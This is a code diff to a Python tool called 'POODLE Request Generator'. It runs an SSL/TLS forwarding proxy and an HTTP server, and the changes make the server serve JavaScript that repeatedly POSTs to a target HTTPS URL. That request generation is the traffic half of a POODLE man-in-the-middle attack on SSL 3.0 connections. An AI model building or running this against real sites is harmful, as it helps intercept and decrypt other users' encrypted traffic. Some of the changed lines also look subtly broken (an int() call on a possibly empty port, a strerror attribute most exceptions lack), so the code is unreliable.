@@ -91,6 +91,8 @@ class SSLTLSHandler(socketserver.BaseRequestHandler):
             pass
         except StopIteration:
             pass
+        except Exception as e:
+            print("Exception: " + e.strerror)
         finally:
             self.forward.close()
             print_debug("Connection closed!")
@@ -109,14 +111,22 @@ class PoodleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
         self.send_response(200);
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.end_headers()
-        self.wfile.write(bytes("<b>POODLE Request Generator</b>", "utf-8"))
+        response = """<!DOCTYPE html>
+        <h1>POODLE Request Generator</h1>
+        <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "{}");
+        xhr.send(null);
+        </script>
+        """.format(args.targetURL)
+        self.wfile.write(bytes(response, "utf-8"))
 
     def version_string(self):
         return "POODLE Request Generator"
 
 ### Functions ###
 def ssltlsServer(queue):
-    print("Starting SSL/TLS server")
+    print("Starting SSL/TLS server on {}:{} forwarding to {}:{}".format(args.listen_host, args.listen_port_tls, args.target_host, args.target_port))
     server = SSLTLSProxy((args.listen_host, int(args.listen_port_tls)), SSLTLSHandler)
     try:
         server.serve_forever()
@@ -124,7 +134,7 @@ def ssltlsServer(queue):
         print("Shutdown of SSL/TLS server on user request")
 
 def httpServer(queue):
-    print("Starting HTTP server")
+    print("Starting HTTP server on {}:{} generating requests to {}".format(args.listen_host, args.listen_port_http, args.targetURL))
     server = http.server.HTTPServer((args.listen_host, int(args.listen_port_http)), PoodleHTTPRequestHandler)
     try:
         server.serve_forever()
@@ -147,7 +157,7 @@ argparser.add_argument("--debug", "-d", action="store_true", help="Debugging out
 args = argparser.parse_args()
 targetURL = urlparse(args.targetURL)
 args.target_host = args.target_host or targetURL.hostname
-args.target_port = args.target_port or targetURL.port or 443
+args.target_port = int(args.target_port) or int(targetURL.port) or 443
 if (targetURL.scheme != "https"):
     print("Target must be HTTPS URL!");
     sys.exit(1)
